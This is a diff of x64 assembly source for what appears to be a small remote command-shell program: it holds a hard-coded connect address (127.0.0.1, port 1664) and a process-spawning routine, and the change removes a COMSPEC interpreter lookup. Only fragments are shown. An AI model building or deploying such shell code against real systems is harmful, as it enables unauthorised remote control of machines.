@@ -23,7 +23,6 @@ system_exec proto   fastcall :qword
 _data$00 segment page 'data'
     g_command_ip        db "127.0.0.1", 0
     g_command_port      dw 1664
-    g_comspec           db "COMSPEC", 0
 _data$00 ends
 
 _text$00 segment align(10h) 'code'
@@ -157,11 +156,6 @@ _text$00 segment align(10h) 'code'
             ; Initialize the local structures to zero
             invoke RtlZeroMemory, addr startup_info, sizeof startup_info
             invoke RtlZeroMemory, addr process_info, sizeof process_info
-
-            ; Get path of command line interpreter
-            invoke GetEnvironmentVariableA, addr g_comspec, addr comspec_path, max_path
-            test eax, eax
-            je _error
 
             ; Prepare startupinfo structure
             mov startup_info.cbsize, sizeof startupinfoa
